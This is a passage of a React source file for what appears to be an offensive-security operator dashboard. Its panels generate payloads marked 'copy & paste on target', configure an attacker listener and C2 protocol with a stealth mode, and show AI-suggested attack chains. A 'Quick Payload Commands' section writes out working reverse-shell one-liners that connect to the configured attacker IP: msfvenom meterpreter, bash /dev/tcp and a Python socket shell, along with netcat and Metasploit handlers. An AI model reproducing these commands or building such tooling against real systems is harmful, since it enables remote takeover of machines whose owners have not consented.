                              <span className="text-[10px] text-[#FF003C] uppercase block mb-1">Payload (copy & paste on target)</span>
                              <div className="flex items-center gap-1">
                                <code className="text-[10px] text-[#FF003C] bg-[#020302] px-2 py-2 flex-1 font-mono break-all">{generatedPayload.payload_content}</code>
                                <button onClick={() => { navigator.clipboard.writeText(generatedPayload.payload_content); addLog("info", "Payload copied"); }} className="text-[#2F4F38] hover:text-[#00FF41] flex-shrink-0"><Copy size={14} /></button>
                              </div>
                            </div>
                          )}
                          <div className="grid grid-cols-4 gap-2 text-[10px]">
                            <div><span className="text-[#2F4F38]">Platform:</span> <span className="text-[#8BBE95]">{generatedPayload.platform}</span></div>
                            <div><span className="text-[#2F4F38]">Arch:</span> <span className="text-[#8BBE95]">{generatedPayload.arch}</span></div>
                            <div><span className="text-[#2F4F38]">LHOST:</span> <span className="text-[#00FF41]">{generatedPayload.lhost}</span></div>
                            <div><span className="text-[#2F4F38]">LPORT:</span> <span className="text-[#00FF41]">{generatedPayload.lport}</span></div>
                          </div>
                          <div className="text-[10px] text-[#8BBE95] mt-1">{generatedPayload.description}</div>
                          {generatedPayload.execution_method && (
                            <div className="text-[10px] text-[#FFB000] mt-1 p-2 border border-[#FFB000]/30 bg-[rgba(255,176,0,0.05)]">
                              {generatedPayload.execution_method}
                            </div>
                          )}
                        </div>
                      </div>
                    )}

                    {/* Template List */}
                    <div className="space-y-1">
                      {payloadTemplates
                        .filter(p => payloadFilter === "all" || p.platform === payloadFilter || p.type === payloadFilter)
                        .map((p, i) => (
                        <div key={i} className="panel p-3" data-testid={`payload-${p.id}`}>
                          <div className="flex items-center justify-between">
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center gap-2">
                                <span className="text-xs text-[#FF003C] font-bold">{p.name}</span>
                                <span className={`text-[10px] px-1 border ${p.type === "oneliner" ? "border-[#FFB000] text-[#FFB000]" : p.type === "implant" ? "border-[#00F0FF] text-[#00F0FF]" : "border-[#00FF41] text-[#00FF41]"}`}>{p.type}</span>
                                <span className="text-[10px] px-1 border border-[#2F4F38] text-[#2F4F38]">{p.platform}/{p.arch}</span>
                              </div>
                              <p className="text-[10px] text-[#8BBE95] mt-1">{p.description}</p>
                            </div>
                            <button onClick={() => generatePayload(p.id)} disabled={!globalConfig.listener_ip} className="tac-btn tac-btn-red text-[10px] flex-shrink-0 ml-3" data-testid={`gen-payload-${p.id}`}>
                              <Zap size={12} /> GENERATE
                            </button>
                          </div>
                        </div>
                      ))}
                      {payloadTemplates.length === 0 && (
                        <div className="text-[10px] text-[#2F4F38] text-center py-8">Loading payload templates...</div>
                      )}
                    </div>
                  </div>
                )}

                {/* ===== AI ===== */}
                {activeSection === "ai" && (
                  <div className="space-y-3" data-testid="ai-section">
                    <div className="flex items-center justify-between">
                      <h3 className="text-xs font-bold tracking-[0.15em] uppercase">AI Decision Engine</h3>
                      {currentScanId && (
                        <div className="flex gap-2">
                          <button onClick={() => window.open(`${API}/scan/${currentScanId}/report/pdf`, '_blank')} className="tac-btn tac-btn-cyan text-[10px]" data-testid="download-pdf-btn"><Download size={12} /> PDF</button>
                        </div>
                      )}
                    </div>

                    {/* AI Analysis */}
                    {aiAnalysis ? (
                      <div className="panel p-4">
                        <div className="panel-header" style={{ margin: "-16px -16px 12px", padding: "8px 12px" }}>
                          <h3 className="flex items-center gap-1"><Brain size={12} /> Kimi K2 Analysis</h3>
                        </div>
                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-xs text-[#8BBE95] whitespace-pre-wrap leading-relaxed max-h-48 overflow-auto">
                          {aiAnalysis}
                        </motion.div>
                      </div>
                    ) : (
                      <div className="panel p-8 text-center text-[10px] text-[#2F4F38]">Run a scan to get AI analysis</div>
                    )}

                    {/* Suggested Chains */}
                    {suggestedChains.length > 0 && (
                      <div className="panel" data-testid="suggested-chains-section">
                        <div className="panel-header"><h3 className="text-[#FFB000]">Suggested Attack Chains</h3></div>
                        <div className="p-3 space-y-1">
                          {suggestedChains.map((c, i) => (
                            <div key={i} onClick={() => { loadChainDetail(c.id); setActiveSection("chains"); }} className="suggestion-card cursor-pointer hover:border-[#FFB000]" data-testid={`ai-suggested-chain-${c.id}`}>
                              <div className="flex items-center justify-between">
                                <span className="text-[10px] text-[#FFB000] font-bold">{c.name}</span>
                                <div className="flex gap-1">
                                  <button className="tac-btn tac-btn-solid text-[10px] py-0 px-2">ACCEPT</button>
                                  <button className="tac-btn tac-btn-red text-[10px] py-0 px-2">IGNORE</button>
                                </div>
                              </div>
                              <p className="text-[10px] text-[#8BBE95] mt-1">{c.description}</p>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {/* ===== CONFIG ===== */}
                {activeSection === "config" && (
                  <div className="space-y-4" data-testid="config-section">
                    <div className="flex items-center justify-between">
                      <h3 className="text-xs font-bold tracking-[0.15em] uppercase">Global Operator Config</h3>
                      <button onClick={saveConfig} disabled={configSaving} className="tac-btn tac-btn-solid text-[10px]" data-testid="save-config-btn">
                        <Save size={12} /> {configSaving ? "SAVING..." : "SAVE CONFIG"}
                      </button>
                    </div>

                    {/* Listener Config - Priority */}
                    <div className="panel p-4">
                      <div className="panel-header" style={{ margin: "-16px -16px 12px", padding: "8px 12px" }}>
                        <h3 className="flex items-center gap-1"><Globe size={12} className="text-[#FF003C]" /> Listener / VPS Config</h3>
                        <span className={`text-[10px] ${globalConfig.listener_ip ? "text-[#00FF41]" : "text-[#FF003C]"}`}>
                          {globalConfig.listener_ip ? "CONFIGURED" : "NOT SET"}
                        </span>
                      </div>
                      <div className="grid grid-cols-2 gap-3">
                        <div>
                          <label className="text-[10px] text-[#2F4F38] uppercase block mb-1">Listener IP (VPS/LHOST)</label>
                          <input type="text" value={globalConfig.listener_ip} onChange={e => setGlobalConfig(prev => ({ ...prev, listener_ip: e.target.value }))} placeholder="e.g. 10.10.14.5" className="tac-input w-full text-xs" data-testid="config-listener-ip" />
                          <p className="text-[10px] text-[#2F4F38] mt-1">IP de tu VPS/atacante. Se inyecta en todos los payloads.</p>
                        </div>
                        <div>
                          <label className="text-[10px] text-[#2F4F38] uppercase block mb-1">Listener Port (LPORT)</label>
                          <input type="number" value={globalConfig.listener_port} onChange={e => setGlobalConfig(prev => ({ ...prev, listener_port: parseInt(e.target.value) || 4444 }))} className="tac-input w-full text-xs" data-testid="config-listener-port" />
                        </div>
                        <div>
                          <label className="text-[10px] text-[#2F4F38] uppercase block mb-1">C2 Protocol</label>
                          <select value={globalConfig.c2_protocol} onChange={e => setGlobalConfig(prev => ({ ...prev, c2_protocol: e.target.value }))} className="tac-input w-full text-xs" data-testid="config-protocol">
                            <option value="tcp">TCP (Reverse Shell)</option>
                            <option value="https">HTTPS (Encrypted)</option>
                            <option value="mtls">mTLS (Sliver)</option>
                            <option value="dns">DNS (Covert)</option>
                          </select>
                        </div>
                        <div>
                          <label className="text-[10px] text-[#2F4F38] uppercase block mb-1">Operator Name</label>
                          <input type="text" value={globalConfig.operator_name} onChange={e => setGlobalConfig(prev => ({ ...prev, operator_name: e.target.value }))} className="tac-input w-full text-xs" data-testid="config-operator-name" />
                        </div>
                      </div>
                    </div>

                    {/* Operation Mode */}
                    <div className="panel p-4">
                      <div className="panel-header" style={{ margin: "-16px -16px 12px", padding: "8px 12px" }}>
                        <h3 className="flex items-center gap-1"><Shield size={12} /> Operation Mode</h3>
                      </div>
                      <div className="space-y-3">
                        <div className="flex items-center justify-between">
                          <div>
                            <div className="text-xs text-[#8BBE95]">Auto-Inject LHOST</div>
                            <div className="text-[10px] text-[#2F4F38]">Inyectar LHOST en todos los payloads/exploits automaticamente</div>
                          </div>
                          <button onClick={() => setGlobalConfig(prev => ({ ...prev, auto_lhost: !prev.auto_lhost }))} className={`w-12 h-6 border transition-all ${globalConfig.auto_lhost ? "border-[#00FF41] bg-[rgba(0,255,65,0.15)]" : "border-[#2F4F38]"}`} data-testid="toggle-auto-lhost">
                            <div className={`w-4 h-4 mx-0.5 transition-all ${globalConfig.auto_lhost ? "ml-6 bg-[#00FF41]" : "bg-[#2F4F38]"}`} />
                          </button>
                        </div>
                        <div className="flex items-center justify-between">
                          <div>
                            <div className="text-xs text-[#8BBE95]">Stealth Mode</div>
                            <div className="text-[10px] text-[#2F4F38]">Evitar herramientas agresivas, delays entre requests</div>
                          </div>
                          <button onClick={() => setGlobalConfig(prev => ({ ...prev, stealth_mode: !prev.stealth_mode }))} className={`w-12 h-6 border transition-all ${globalConfig.stealth_mode ? "border-[#FFB000] bg-[rgba(255,176,0,0.15)]" : "border-[#2F4F38]"}`} data-testid="toggle-stealth">
                            <div className={`w-4 h-4 mx-0.5 transition-all ${globalConfig.stealth_mode ? "ml-6 bg-[#FFB000]" : "bg-[#2F4F38]"}`} />
                          </button>
                        </div>
                      </div>
                    </div>

                    {/* Quick Commands */}
                    <div className="panel p-4">
                      <div className="panel-header" style={{ margin: "-16px -16px 12px", padding: "8px 12px" }}>
                        <h3>Quick Payload Commands</h3>
                      </div>
                      <div className="space-y-2">
                        {[
                          { label: "MSFvenom Reverse Shell", cmd: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${globalConfig.listener_ip || "YOUR_IP"} LPORT=${globalConfig.listener_port} -f exe > shell.exe` },
                          { label: "Bash Reverse Shell", cmd: `bash -i >& /dev/tcp/${globalConfig.listener_ip || "YOUR_IP"}/${globalConfig.listener_port} 0>&1` },
                          { label: "Python Reverse Shell", cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${globalConfig.listener_ip || "YOUR_IP"}",${globalConfig.listener_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
                          { label: "NC Listener", cmd: `nc -lvnp ${globalConfig.listener_port}` },
                          { label: "MSF Handler", cmd: `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${globalConfig.listener_ip || "YOUR_IP"}; set LPORT ${globalConfig.listener_port}; exploit"` },
                        ].map((item, i) => (
                          <div key={i} className="flex items-center gap-2">
                            <span className="text-[10px] text-[#FFB000] w-40 flex-shrink-0">{item.label}</span>
                            <code className="text-[10px] text-[#00FF41] bg-[#020302] px-2 py-1 flex-1 truncate font-mono">{item.cmd}</code>
                            <button onClick={() => { navigator.clipboard.writeText(item.cmd); addLog("info", `Copied: ${item.label}`); }} className="text-[#2F4F38] hover:text-[#00FF41] flex-shrink-0" data-testid={`copy-cmd-${i}`}><Copy size={12} /></button>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                )}

                {/* ===== LOGS ===== */}
                {activeSection === "logs" && (
                  <div className="space-y-3 h-full flex flex-col" data-testid="logs-section">
                    <div className="flex items-center gap-2">
                      {["all", "cmd", "success", "error", "warning", "info"].map(f => (
                        <button key={f} onClick={() => setLogFilter(f)} className={`text-[10px] px-2 py-1 border uppercase ${logFilter === f ? "border-[#00FF41] text-[#00FF41]" : "border-[rgba(0,255,65,0.15)] text-[#2F4F38]"}`} data-testid={`log-filter-${f}`}>{f}</button>
                      ))}
                    </div>
                    <div className="panel flex-1 p-3 overflow-auto font-mono" ref={terminalRef} style={{ background: "var(--bg-panel)" }}>
                      {filteredLogs.map((l, i) => (
                        <div key={i} className={`terminal-line ${l.type}`}>
                          <span className="text-[#2F4F38] mr-2">{l.time.toLocaleTimeString()}</span>
                          {l.text}
                        </div>
                      ))}
                    </div>
                  </div>
                )}

              </motion.div>
            </AnimatePresence>
          </div>

          {/* RIGHT: Terminal Panel (always visible) */}
          <div className="w-80 flex-shrink-0 border-l border-[rgba(0,255,65,0.15)] flex flex-col" style={{ background: "var(--bg-panel)" }}>
            <div className="panel-header">
              <h3 className="flex items-center gap-1"><Terminal size={12} /> LIVE OUTPUT</h3>
              <span className="text-[10px] text-[#2F4F38]">{terminalLines.length}</span>
            </div>
            <div className="flex-1 overflow-auto p-2 font-mono" ref={terminalRef}>
              {terminalLines.slice(-80).map((l, i) => (
                <div key={i} className={`terminal-line ${l.type}`}>{l.text}</div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
